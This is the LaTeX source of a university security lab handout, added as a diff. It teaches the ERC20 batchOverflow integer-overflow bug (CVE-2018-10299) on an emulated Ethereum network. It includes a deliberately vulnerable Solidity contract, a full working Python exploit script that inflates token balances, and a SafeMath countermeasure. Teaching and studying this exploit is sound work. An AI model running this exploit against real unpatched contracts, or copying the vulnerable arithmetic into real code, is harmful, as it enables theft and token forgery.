@@ -1,0 +1,396 @@
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  Copyright by Wenliang Du.                                       %%
+%%  This work is licensed under the Creative Commons                %%
+%%  Attribution-NonCommercial-ShareAlike 4.0 International License. %%
+%%  To view a copy of this license, visit                           %%
+%%  http://creativecommons.org/licenses/by-nc-sa/4.0/.              %%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+% Include common header, copyright, and Solidity highlighting
+\newcommand{\commonfolder}{../../common-files}
+\input{\commonfolder/header}
+\input{\commonfolder/copyright}
+\input{\commonfolder/solidity-highlighting.tex}
+
+% Fix fancyhdr headheight warning
+\setlength{\headheight}{13.6pt}
+
+% Configure hyperref (override default settings from header.tex if needed)
+\hypersetup{
+    colorlinks=true,
+    linkcolor=blue,
+    filecolor=magenta,
+    urlcolor=cyan,
+    pdfborder={0 0 0}
+}
+
+% Setting left header
+\lhead{\bfseries SEED Labs -- Smart Contract batchOverflow Attack Lab}
+
+% Define custom command for pointing up right
+\newcommand{\pointupright}[1]{\ding{218} \textbf{\texttt{#1}}}
+
+\begin{document}
+
+% Creating title page
+\begin{center}
+{\LARGE Smart Contract batchOverflow Attack Lab}
+\end{center}
+
+\seedlabcopyright{2025}
+
+% Overview Section
+\section{Overview}
+
+The batchOverflow bug, identified as CVE-2018-10299, was a critical vulnerability discovered in multiple ERC20 smart contracts in 2018, most notably affecting the Beauty Ecosystem Coin (BEC). This flaw allowed attackers to exploit an integer overflow in the \texttt{batchTransfer} function, enabling them to generate an arbitrary number of tokens, leading to significant financial losses~\cite{PeckShield2018}. The vulnerability arises from unchecked arithmetic operations in Solidity versions prior to 0.8.0, which do not automatically prevent integer overflows~\cite{CVE-2018-10299}.
+
+This lab provides students with hands-on experience in exploiting the batchOverflow vulnerability. Students will interact with a vulnerable smart contract and execute an attack script to demonstrate how the exploit inflates account balances. The lab is conducted within the SEED Internet Emulator, featuring a deployed Ethereum blockchain. Topics covered include:
+
+\begin{itemize}[noitemsep]
+    \item The batchOverflow vulnerability
+    \item Integer overflow in Solidity
+    \item Blockchain and smart contract interactions
+    \item The SEED Internet Emulator
+\end{itemize}
+
+\paragraph{Lab environment.}
+\seedenvironmentB
+\nodependency
+We recommend configuring the virtual machine with at least two CPU cores and 4GB of RAM. This lab requires Python 3.12.7 with \texttt{web3.py} version 7.12.1, installed using:
+
+\begin{lstlisting}
+$ pip3 install web3==7.12.1
+\end{lstlisting}
+
+\paragraph{Note to instructors.}
+The batchOverflow attack highlights critical smart contract vulnerabilities. This lab covers the basics but is not a comprehensive tutorial. Instructors should introduce integer overflow concepts in class beforehand. Students can refer to resources like~\cite{PeckShield2018} for additional context.
+
+% Lab Setup Section
+\section{The Lab Setup and the SEED Internet Emulator}
+\label{sec:labsetup}
+
+\subsection{Emulator}
+
+This lab is performed within the SEED Internet Emulator. New users should review this section carefully. Instructors are encouraged to offer a session to familiarize students with the emulator.
+
+\input{../common-files/emulator.tex}
+
+\paragraph{EtherView.}
+\input{../common-files/etherview.tex}
+
+\subsection{The Client Code}
+
+Students will use Python programs with the \texttt{web3.py} library to interact with the Ethereum network. Wrapper functions are provided in \texttt{SEEDWeb3.py}, located in the \texttt{Labsetup/shared} folder. Install \texttt{web3.py} version 7.12.1 using:
+
+\begin{lstlisting}
+$ pip3 install web3==7.12.1
+\end{lstlisting}
+
+\subsection{Connecting to the Blockchain}
+\label{sec:sub:ports}
+
+To interact with the blockchain, connect to an Ethereum node via HTTP on port 8545 using its IP address. Example:
+
+\begin{lstlisting}
+web3 = SEEDWeb3.connect_to_geth_pos('http://10.151.0.71:8545')
+\end{lstlisting}
+
+\subsection{Accounts}
+
+Each Ethereum node in the emulator has pre-created accounts with balances. For transactions, we use a funded account with a known private key (\texttt{\scriptsize 6510652e04c9bcb471982164cf779fc0b624bb26bc3cfe5a8a54bddeba90d667}). Access accounts via \texttt{web3.eth.accounts[]}. Example:
+
+\begin{lstlisting}
+private_key = "6510652e04c9bcb471982164cf779fc0b624bb26bc3cfe5a8a54bddeba90d667"
+attacker_account = web3.eth.account.from_key(private_key).address
+\end{lstlisting}
+
+Check balances using the provided \texttt{get\_balance.py} script, which calls:
+
+\begin{lstlisting}
+web3.eth.get_balance(Web3.toChecksumAddress(address))
+\end{lstlisting}
+
+% Task 1 Section
+\section{Task 1: Getting Familiar with the Vulnerable Smart Contract}
+
+The vulnerable contract, \path{BatchOverFlow.sol}, is a simplified ERC20 token contract with a \texttt{batchTransfer} function prone to integer overflow. Find it at \path{Labsetup/contract/BatchOverFlow.sol}:
+
+\begin{lstlisting}[language=Solidity, caption = The vulnerable contract (\texttt{BatchOverFlow.sol})]
+    % SPDX-License-Identifier: MIT
+pragma solidity ^0.6.8;
+
+interface ERC20 {
+    function transfer(address to, uint256 value) external returns (bool);
+}
+
+contract BECBatchOverflowVulnerable {
+    mapping(address => uint256) public balances;
+    uint256 public totalSupply;
+
+    constructor(uint256 initialSupply) public {
+        balances[msg.sender] = initialSupply;
+        totalSupply = initialSupply;
+    }
+
+    function batchTransfer(address[] calldata receivers, uint256 value) external returns (bool) {
+        uint256 cnt = receivers.length;
+        uint256 amount = cnt * value;  % Risk of overflow
+        require(value > 0, "Value should be greater than 0");
+        require(balances[msg.sender] >= amount, "Not enough balance");
+
+        for (uint i = 0; i < cnt; i++) {
+            balances[receivers[i]] += value;
+        }
+        balances[msg.sender] -= amount;
+        return true;
+    }
+}
+\end{lstlisting}
+
+Key functions:
+\begin{itemize}
+    \item \texttt{constructor}: Initializes the token supply for the deployer.
+    \item \texttt{batchTransfer}: Transfers \texttt{value} tokens to each address in \texttt{receivers}. The calculation \texttt{amount = cnt * value} risks overflow if \texttt{cnt * value} exceeds \texttt{2\^{}256}, allowing the balance check to pass incorrectly.
+\end{itemize}
+
+\subsection{Task 1.a: Compiling the Contract}
+
+Use Solidity version 0.6.8 (compiler \texttt{solc-0.6.8} in \texttt{Labsetup/contract}) to compile:
+
+\begin{lstlisting}
+solc-0.6.8 --overwrite --abi --bin -o . BatchOverFlow.sol
+\end{lstlisting}
+
+This generates \texttt{BatchOverFlow.bin} (bytecode) and \texttt{BatchOverFlow.abi} (interface) files.
+
+\subsection{Task 1.b: Deploying the Vulnerable Contract}
+
+Deploy using \texttt{deploy\_victim\_contract.py} in \path{Labsetup/victim} with the funded account’s private key:
+
+\begin{lstlisting}[language=python, caption={Deploying the contract (\texttt{deploy\_victim\_contract.py})}]
+#!/bin/env python3
+
+from web3 import Web3
+import os
+import sys
+
+# Add the shared folder to sys.path
+sys.path.append(os.path.abspath("../shared"))
+
+import SEEDWeb3
+
+abi_file = "../contract/BatchOverFlow.abi"
+bin_file = "../contract/BatchOverFlow.bin"
+
+# Connect to a geth node
+web3 = SEEDWeb3.connect_to_geth_pos('http://10.151.0.71:8545')
+
+# === Your private key and derived account ===
+private_key = "6510652e04c9bcb471982164cf779fc0b624bb26bc3cfe5a8a54bddeba90d667"
+
+print("Sending tx ...")
+addr = SEEDWeb3.deploy_contract(web3, private_key, abi_file, bin_file, 0)
+print("Victim contract: {}".format(addr))
+with open("contract_address_victim.txt", "w") as fd:
+    fd.write(addr)
+\end{lstlisting}
+
+Save the contract address from the output.
+
+\subsection{Task 1.c: Interacting with the Vulnerable Contract}
+
+Before the attack, verify that the virtual balances of accounts (e.g., \texttt{web3.eth.accounts[0]} and \texttt{web3.eth.accounts[1]}) are zero using \texttt{get\_balance.py}:
+
+\begin{lstlisting}[language=python, caption={Checking balances (\texttt{get\_balance.py})}]
+from web3 import Web3
+import os
+import sys
+
+# Add the shared folder to sys.path
+sys.path.append(os.path.abspath("../shared"))
+
+import SEEDWeb3
+
+# Path to ABI file
+abi_file    = "../contract/BatchOverFlow.abi"
+
+# Address of the deployed vulnerable contract
+victim_addr = 'put address here'
+
+# Connect to geth node (PoS)
+web3 = SEEDWeb3.connect_to_geth_pos('http://10.151.0.71:8545')
+
+# Choose a sender account
+account_0 = web3.eth.accounts[0]
+account_1 = web3.eth.accounts[1]
+
+# Load ABI and contract
+contract_abi  = SEEDWeb3.getFileContent(abi_file)
+contract = web3.eth.contract(address=victim_addr, abi=contract_abi)
+
+# Call the getBalance view function
+balance_0 = contract.functions.getBalance(account_0).call()
+balance_1 = contract.functions.getBalance(account_1).call()
+
+# Print the balance
+print(f"Virtual Balance of {account_0} in contract : {balance_0} wei ({web3.from_wei(balance_0, 'ether')} ETH)")
+print(f"Virtual Balance of {account_1} in contract : {balance_1} wei ({web3.from_wei(balance_1, 'ether')} ETH)")
+\end{lstlisting}
+
+\paragraph{Lab task:} Deploy the contract and transfer 100 tokens to another account using a script similar to \texttt{fund\_contract.py}. Verify balances with \texttt{get\_balance.py}.
+
+% Task 2 Section
+\section{Task 2: The Attacking Script}
+
+To exploit the overflow, craft a transaction where \texttt{cnt * value} exceeds \texttt{2\^{}256}. The provided \texttt{launch\_attack.py} uses two receiver accounts and sets \texttt{value = 2\^{}255} to cause an overflow:
+
+\begin{lstlisting}[language=python, caption={Launching the attack (\texttt{launch\_attack.py})}]
+#!/usr/bin/env python3
+
+from web3 import Web3
+import sys
+import os
+
+# Add the shared folder to sys.path
+sys.path.append(os.path.abspath("../shared"))
+
+import SEEDWeb3
+
+# Connect to the Geth PoS node
+web3 = SEEDWeb3.connect_to_geth_pos('http://10.151.0.71:8545')
+
+# Use account[1] as the attacker
+private_key = "6510652e04c9bcb471982164cf779fc0b624bb26bc3cfe5a8a54bddeba90d667"
+attacker_account = web3.eth.account.from_key(private_key).address
+
+# Load ABI and victim contract
+abi_file    = "../contract/BatchOverFlow.abi"
+victim_addr = "put address here"
+
+contract_abi = SEEDWeb3.getFileContent(abi_file)
+contract = web3.eth.contract(address=victim_addr, abi=contract_abi)
+
+# Prepare the overflow value (2^255)
+overflow_value = 0x8000000000000000000000000000000000000000000000000000000000000000
+
+# Prepare the receiver list (must be 2 addresses for cnt=2 to cause 2^256 overflow)
+receivers = [web3.eth.accounts[0], web3.eth.accounts[1]]
+
+# Send the transaction
+print("Launching batchOverflow attack...")
+nonce = web3.eth.get_transaction_count(attacker_account)
+
+transaction = contract.functions.batchTransfer(receivers, overflow_value).build_transaction({
+    'from': attacker_account,
+    'nonce': nonce,
+    'gas': 500000,
+    'gasPrice': web3.to_wei('10', 'gwei'),
+    'chainId': 1337
+})
+
+signed_tx = web3.eth.account.sign_transaction(transaction, private_key)
+tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
+
+print("Transaction sent, waiting for block confirmation...")
+tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
+
+print(f"Attack completed. Transaction Hash: {tx_hash.hex()}")
+print("Transaction Receipt:")
+print(tx_receipt)
+
+# Check the Virtual balance of the receivers account after the attack
+balance_0 = contract.functions.getBalance(receivers[0]).call()
+balance_1 = contract.functions.getBalance(receivers[1]).call()
+
+# Print the balance
+print("-\n----------------------------------------------------------")
+print(f"Virtual Balance of {receivers[0]} in contract : {balance_0} wei ({web3.from_wei(balance_0, 'ether')} ETH)")
+print(f"Virtual Balance of {receivers[1]} in contract : {balance_1} wei ({web3.from_wei(balance_1, 'ether')} ETH)")
+\end{lstlisting}
+
+Modify \texttt{victim\_addr} with the deployed contract address.
+
+% Task 3 Section
+\section{Task 3: Launching the batchOverflow Attack}
+
+Steps:
+\begin{enumerate}
+    \item Deploy the contract with \texttt{deploy\_victim\_contract.py}.
+    \item Verify initial zero balances for \texttt{web3.eth.accounts[0]} and \texttt{web3.eth.accounts[1]} using \texttt{get\_balance.py}.
+    \item Update \texttt{launch\_attack.py} with the contract address.
+    \item Run \texttt{launch\_attack.py} to execute the attack.
+    \item Verify that the receivers’ balances are now extremely large (e.g., in ETH) using \texttt{get\_balance.py}.
+\end{enumerate}
+
+\paragraph{Lab task:} Execute the attack and show the inflated balances.
+
+% Task 4 Section
+\section{Task 4: Countermeasures}
+
+Prevent overflow by:
+\begin{itemize}
+    \item Using OpenZeppelin’s SafeMath library.
+    \item Upgrading to Solidity 0.8.0+ for built-in overflow checks.
+    \item Adding explicit overflow checks before arithmetic operations.
+\end{itemize}
+
+Example with SafeMath:
+\begin{lstlisting}[language=Solidity]
+import "@openzeppelin/contracts/utils/math/SafeMath.sol";
+
+contract SafeContract {
+    using SafeMath for uint256;
+    mapping(address => uint256) public balances;
+    uint256 public totalSupply;
+
+    constructor(uint256 initialSupply) public {
+        balances[msg.sender] = initialSupply;
+        totalSupply = initialSupply;
+    }
+
+    function batchTransfer(address[] calldata receivers, uint256 value) external returns (bool) {
+        uint256 cnt = receivers.length;
+        uint256 amount = cnt.mul(value);  % Safe multiplication
+        require(value > 0, "Value should be greater than 0");
+        require(balances[msg.sender] >= amount, "Not enough balance");
+
+        for (uint i = 0; i < cnt; i++) {
+            balances[receivers[i]] = balances[receivers[i]].add(value);
+        }
+        balances[msg.sender] = balances[msg.sender].sub(amount);
+        return true;
+    }
+}
+\end{lstlisting}
+
+\paragraph{Lab task:} Modify \path{BatchOverFlow.sol} with SafeMath, redeploy, and attempt the attack again. Report whether the exploit succeeds.
+
+% Submission Section
+\section{Submission}
+
+Submit a report with:
+\begin{itemize}
+    \item Screenshots/logs of contract deployment.
+    \item Screenshots/logs of attack execution showing balance changes.
+    \item Explanation of the attack mechanism.
+    \item Countermeasure implementation and results.
+\end{itemize}
+
+% Acknowledgment Section
+\section*{Acknowledgment}
+
+This lab was developed with assistance from Muhammad Jamshaid Ghaffar, a final-year undergraduate Computer Science student in the Department of Computing at the National University of Sciences and Technology (NUST). The SEED project is supported by grants from the US National Science Foundation and Syracuse University.
+
+% Bibliography
+\begin{thebibliography}{90}
+\bibitem{CVE-2018-10299}
+CVE-2018-10299, "Integer Overflow in Multiple ERC20 Smart Contracts",
+\url{https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10299}
+
+\bibitem{PeckShield2018}
+PeckShield, "Alert: New batchOverflow Bug in Multiple ERC20 Smart Contracts (CVE-2018-10299)", 2018,
+\url{https://peckshield.medium.com/alert-new-batchoverflow-bug-in-multiple-erc20-smart-contracts-cve-2018-10299-511067db6536}
+\end{thebibliography}
+
+\end{document}
